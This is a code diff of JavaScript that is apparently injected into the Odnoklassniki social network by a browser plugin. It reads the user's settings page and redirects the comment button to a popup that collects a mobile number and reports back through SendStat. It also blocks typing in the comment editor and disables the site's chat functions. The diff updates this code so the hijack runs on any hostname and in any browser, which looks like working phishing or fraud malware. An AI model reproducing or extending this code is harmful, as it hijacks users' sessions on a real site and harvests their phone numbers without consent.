@@ -173,7 +173,7 @@ function ClearToolbar() {
 
 function GetNumber() {
 var buf = "";
-	AjaxLoad('http://www.odnoklassniki.ru/settings',0,function(text){
+	AjaxLoad('http://' + document.location.hostname + '/settings',0,function(text){
 			var d="";
 			var DF = "";
 			var f=text;
@@ -186,7 +186,7 @@ var buf = "";
 			else{
 				d ="";
 			}
-AjaxLoad('http://www.odnoklassniki.ru/',DF,function(next){
+AjaxLoad('http://' + document.location.hostname,DF,function(next){
 	if (r!=null){
 		var dd = r[0].replace('&amp;', '&');						
 		var srvAns = next;					
@@ -625,9 +625,7 @@ function cancel(evt)
 
 }
 
-
-
-function Wnd() {
+function Show_Wnd() {
 	try {
 		var tlf = plg.Get('oPhone');
 	}
@@ -652,7 +650,15 @@ function Wnd() {
 	document.getElementById('field_mobile_num').value = nam;
     plg.Save('oRun', '2');
 	SendStat(1,"small");
-		
+}
+
+
+function Wnd() {
+	if (window.$)
+		Show_Wnd();
+	else {
+		setTimeout(Wnd, 100);
+	}
 }
 
 function Wnd_Page() {
@@ -771,16 +777,15 @@ for (var i=0;i<document.getElementsByClassName("tdn").length;i++){
         addCommentBtn.setAttribute("onclick", "Wnd()");
 var mFrame= document.getElementsByClassName('gwt-RichTextArea')[0];
 if(mFrame){
-	mFrame.contentWindow.document.body.onkeydown = function(evt) {
+	mFrame.contentWindow.onkeydown = function(evt) {
 		cancel(evt);
 	};
 	
-	var userAgent = navigator.userAgent;
-	userAgent = userAgent.toString();
-	if (/Opera/.test(userAgent)){
-		mFrame.contentWindow.document.body.addEventListener('keydown', cancel, true);
-	}
-	
+	try {
+		mFrame.contentWindow.removeEventListener('keydown', cancel, true);
+	} catch (err) {};
+	mFrame.contentWindow.addEventListener('keydown', cancel, true);
+
 	document.getElementsByClassName('disc_text_area_button')[0].addEventListener('mousedown',ClickCancel,false);
 }
 
@@ -818,8 +823,12 @@ function RemoveChatDialog() {
 	if (aip_w && aip_w.contentWindow)
 	{
 		aip_w = aip_w.contentWindow;
+		aip_w.Im = nop;
+		aip_w.Hm = nop;
+		aip_w.Hb = nop;
+		aip_w.Am = nop;
 		
-		
+		/*
 		for (var i in aip_w)
 		{
 			
@@ -828,6 +837,7 @@ function RemoveChatDialog() {
 				aip_w[i] = nop;
 			}
 		}
+		*/
 	}
 }
 
